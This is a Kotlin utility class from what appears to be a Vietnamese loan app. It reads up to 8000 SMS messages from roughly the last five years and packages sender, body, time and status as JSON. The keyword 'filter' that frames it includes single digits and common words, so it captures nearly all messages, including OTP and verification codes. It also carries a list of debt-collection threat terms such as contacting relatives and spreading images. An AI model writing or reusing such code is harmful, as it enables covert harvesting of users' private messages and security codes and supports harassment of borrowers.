package com.vaycore.finance.util.runtime

import android.Manifest
import android.content.pm.PackageManager
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.vaycore.finance.App
import org.json.JSONArray
import org.json.JSONObject

object SmsInfoHelper {

    private fun hasReadSMSPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            App.appContext, Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun getSmsInfosByKeywords(
        keywords: List<String> = KEYWORDS,
        daysAgo: Int = 2000,
        limit: Int = 8000
    ): JSONArray {

        val result = JSONArray()

        if (!hasReadSMSPermission()) {
            return result
        }

        val resolver = App.appContext.contentResolver

        val timeLimit = System.currentTimeMillis() - daysAgo * 24L * 60 * 60 * 1000

        val projection = arrayOf(
            "address",
            "body",
            "date",
            "type",
            "status",
            "read"
        )

        try {
            resolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                "date > ?",
                arrayOf(timeLimit.toString()),
                "date DESC"
            )?.use { cursor ->
                if (cursor.count == 0) return result
                // cache column indices upfront
                val idxAddress = cursor.getColumnIndex("address")
                val idxBody = cursor.getColumnIndex("body")
                val idxDate = cursor.getColumnIndex("date")
                val idxType = cursor.getColumnIndex("type")
                val idxStatus = cursor.getColumnIndex("status")
                val idxRead = cursor.getColumnIndex("read")
                var count = 0
                while (cursor.moveToNext() && count < limit) {

                    val body = if (idxBody >= 0) cursor.getString(idxBody) ?: "" else ""

                    // keyword filter (case-insensitive)
                    if (!keywords.any { body.contains(it, ignoreCase = true) }) {
                        continue
                    }

                    val json = JSONObject().apply {

                        put(
                            "phoneNo",
                            if (idxAddress >= 0) cursor.getString(idxAddress) ?: "" else ""
                        )

                        put("content", body)

                        put(
                            "sendTime",
                            if (idxDate >= 0) cursor.getLong(idxDate).toString() else ""
                        )

                        val typeInt =
                            if (idxType >= 0) cursor.getInt(idxType) else 0

                        put(
                            "smsDirection",
                            when (typeInt) {
                                1 -> "IN"
                                2 -> "OUT"
                                else -> JSONObject.NULL
                            }
                        )

                        put("smsType", typeInt)

                        put(
                            "smsStatus",
                            if (idxStatus >= 0) cursor.getInt(idxStatus) else 0
                        )

                        put(
                            "isRead",
                            if (idxRead >= 0) cursor.getInt(idxRead) else 0
                        )
                    }

                    result.put(json)
                    count++
                }
            }

        } catch (e: SecurityException) {
            e.printStackTrace()
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return result
    }

    val KEYWORDS: List<String> = listOf(

        // ===== English Loan =====
        "Loan", "Borrowing", "Lending", "Loan application",
        "Loan amount", "Loan term", "Interest", "Interest rate",
        "Annual interest rate", "Daily interest rate", "Monthly interest rate",
        "Borrowing limit", "Credit limit", "Available limit", "Loan limit",
        "Apply for a loan", "Application submission", "Application status",
        "Application review", "Loan disbursement notice", "Disbursed amount",
        "Funds received", "Funds disbursed", "Review approved", "Review failed",
        "Under review", "Document review", "Approval status",
        "Approval result", "Approval approved", "Under approval",
        "Repayment amount", "Repayment date", "Repayment reminder",
        "Repayment method", "Early repayment", "Overdue reminder",
        "Overdue fee", "Overdue days", "Overdue record", "Overdue interest",
        "Automatic deduction", "Deduction notice", "Deduction failed",
        "Deduction successful", "Bill amount", "Bill date",
        "Repayment bill", "Bill issued", "Settlement proof",
        "Loan settlement", "Early settlement", "Settlement fee",
        "Account balance", "Account details", "Account status",
        "Password change", "Password reset", "Account freeze",
        "Unfreeze request", "Identity verification", "Verification code",
        "Transaction amount", "Transaction failed", "Transaction successful",
        "Transfer amount", "Transfer successful", "Transfer failed",
        "Withdrawal request", "Withdrawal successful", "Withdrawal failed",
        "Recharge successful", "Recharge failed",
        "Discount coupon", "Promo code", "Cash reward",
        "Referral reward", "Cashback amount", "Security alert",
        "Risk alert", "Risk assessment", "Security risk",

        // ===== Vietnamese Loan & Finance =====
        "Khoản vay", "Vay mượn", "Cho vay", "Đơn xin vay", "Số tiền vay", "Thời hạn vay",
        "Lãi suất", "Giới hạn vay", "Giới hạn tín dụng", "Nộp đơn xin vay", "Tình trạng đơn",
        "Thông báo giải ngân khoản vay", "Số tiền đã giải ngân", "Tiền đã nhận",
        "Ngày trả nợ", "Nhắc nhở trả nợ", "Phí quá hạn", "Số ngày quá hạn",
        "Lãi suất quá hạn", "Khấu trừ tự động", "Số tiền hóa đơn", "Thanh toán khoản vay",
        "Số dư tài khoản", "Chi tiết giao dịch", "Giao dịch thành công", "Giao dịch không thành công",
        "Hoạt động khuyến mãi", "Mã khuyến mãi", "Tiền thưởng", "Hoàn tiền",
        "Cảnh báo rủi ro", "Thông báo tài khoản", "Tỷ lệ lãi suất", "Tỷ lệ lãi suất hàng năm",
        "Tỷ lệ lãi suất hàng ngày", "Tỷ lệ lãi suất hàng tháng", "Giới hạn khả dụng", "Giới hạn khoản vay",
        "Đơn", "Xem xét đơn", "Tiền đã giải ngân", "Xét duyệt được phê duyệt",
        "Xét duyệt không thành công", "Đang xem xét", "Xem xét tài liệu", "Tình trạng phê duyệt",
        "Kết quả phê duyệt", "Phê duyệt được chấp nhận", "Đang phê duyệt", "Liên quan đến việc trả nợ",
        "Số tiền trả nợ", "Phương thức trả nợ", "Trả nợ trước hạn", "Nhắc nhở quá hạn",
        "Hồ sơ quá hạn", "Thông báo khấu trừ", "Khấu trừ không thành công", "Khấu trừ thành công",
        "Ngày hóa đơn", "Hóa đơn trả nợ", "Hóa đơn đã phát hành", "Chứng từ thanh toán",
        "Thanh toán trước hạn", "Phí thanh toán", "Quản lý tài khoản", "Chi tiết tài khoản",
        "Thay đổi tài khoản", "Tình trạng tài khoản", "Thay đổi mật khẩu", "Đặt lại mật khẩu",
        "Mật khẩu không đúng", "Đóng băng tài khoản", "Yêu cầu mở khóa", "Tài khoản đã được mở khóa",
        "Xác minh danh tính", "Mã xác minh", "Xác minh thông tin", "Cập nhật thông tin",
        "Cập nhật liên hệ", "Cập nhật địa chỉ", "Liên quan đến giao dịch", "Số tiền giao dịch",
        "Số tiền chuyển", "Chuyển khoản thành công", "Chuyển khoản không thành công",
        "Yêu cầu rút tiền", "Rút tiền thành công", "Rút tiền không thành công",
        "Nạp tiền thành công", "Nạp tiền không thành công", "Số tiền nạp",
        "Tỷ lệ giảm giá", "Thưởng tiền mặt", "Thưởng điểm", "Thưởng giới thiệu",
        "Hoạt động hoàn tiền", "Số tiền hoàn tiền", "Tiền hoàn lại đã nhận", "Tặng quà",
        "Số tiền quà tặng", "Điểm quà tặng", "Cảnh báo bảo mật", "Nhắc nhở bảo mật",
        "Nhắc nhở giao dịch", "Nhắc nhở rủi ro", "Thông báo quan trọng", "Thông báo hệ thống",
        "Đánh giá rủi ro", "Rủi ro bảo mật",

        // ===== General Vietnamese =====
        "Xin chào", "Chào bạn", "Bạn", "Anh", "Chị", "Tôi", "Mình", "Anh ấy", "Cô ấy", "Người đó",
        "Hôm nay", "Ngày mai", "Hôm qua", "Tháng này", "Tháng sau", "Tháng trước",
        "Công ty", "Doanh nghiệp", "Ở nhà", "Trong nhà", "Tòa án", "Cảnh sát", "Công an", "Luật sư",
        "Đến nhà bạn", "Tới nhà bạn", "Khởi kiện", "Kiện tụng", "Cha mẹ", "Bố mẹ", "Cha", "Bố", "Ba", "Mẹ", "Má",
        "Anh em", "Chị em", "Anh trai", "Em trai", "Chị gái", "Em gái",
        "Khách VIP", "Khách hàng", "Đối tác", "Dịch vụ chăm sóc khách hàng", "Hỗ trợ khách hàng",
        "Điện thoại", "Gọi điện", "Mã xác nhận", "Mã OTP", "Mua", "Bán", "Mua hàng", "Bán hàng",
        "Giao dịch", "Của", "Có", "Ở", "Tại", "VND",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "Xin chao", "Chao ban", "Ban", "Anh", "Chi", "Toi", "Minh", "Anh ay", "Co ay", "Nguoi do",
        "Hom nay", "Ngay mai", "Hom qua", "Thang nay", "Thang sau", "Thang truoc",
        "Cong ty", "Doanh nghiep", "O nha", "Trong nha", "Toa an", "Canh sat", "Cung an", "Luat su",
        "Den nha ban", "Toi nha ban", "Khoi kien", "Kien tung", "Cha me", "Bo me", "Cha", "Bo", "Ba", "Me", "Ma",
        "Anh em", "Chi em", "Anh trai", "Em trai", "Chi gai", "Em gai",
        "Khach VIP", "Khach hang", "Doi tac", "Dich vu cham soc khach hang", "Ho tro khach hang",
        "Dien thoai", "Goi dien", "Ma xac nhan", "Ma OTP", "Mua", "Ban", "Mua hang", "Ban hang",
        "Giao dich", "Cua", "Co", "O", "Tai",

        // ===== Collection / Negative Threats =====
        "dinh chi", "xu ly ky luat", "canh bao nghiem trong",
        "se bi phat", "hau qua nghiem trong", "do ngu",
        "vo dung", "khon nan", "cam mom", "im di",
        "mat tri", "xau xa", "vuot han", "cham tra",
        "lien he nguoi than", "tron tranh", "khong hop tac",
        "vang mat", "se khieu nai", "chui rua",
        "mat uy tin", "ghi no xau CIC", "phat tan hinh anh",
        "mua ban no", "co quan thu thap", "tre han",
        "gian lan", "tri hoan",
        "thanh ly va boi thuong toan bo hd",
        "giay trieu tap", "lai qua han",
        "yeu cau thanh toan", "danh ba",
        "chuyen thu no tai nha", "ban be", "dia phuong",
        "chuyen thu no", "ban giao hop dong",
        "thu hoi no", "khong tra no",
        "lich su tin dung", "thu no", "chuyen vien",
        "qua han thanh toan", "nguoi than",
        "giay bao no", "anh huong danh du",
        "xu ly tiep theo", "vay tam",
        "cat dut lien lac", "nghia vu thanh toan",
        "den han", "qua han", "lien he ngay",
        "du no", "tre han nhieu ngay",
        "cong bo no", "bao no", "hop dong",
        "boi thuong", "hoan tra", "trieu tap",
        "xoa no", "thanh toan di",
        "tranh phat sinh phi", "thong bao no",
        "no xau", "se ap dung bien phap",
        "xu ly khoan vay", "cung cap thong tin sai",
        "nhac no", "gui ve dia phuong",
        "vi pham", "tai nha",
        "thanh ly", "dong truoc",
        "tra no", "canh bao",
        "bao no dong loat", "danh du",
        "khong thanh toan",
        "thu nhap khong chinh xac",
        "cong khai",
        "tinh lai qua han",
        "giam phi tre han",
        "phi cham",
        "chiem doat tai san",
        "gia dinh",
        "no qua han",
        "no xau nhom"
    )
}
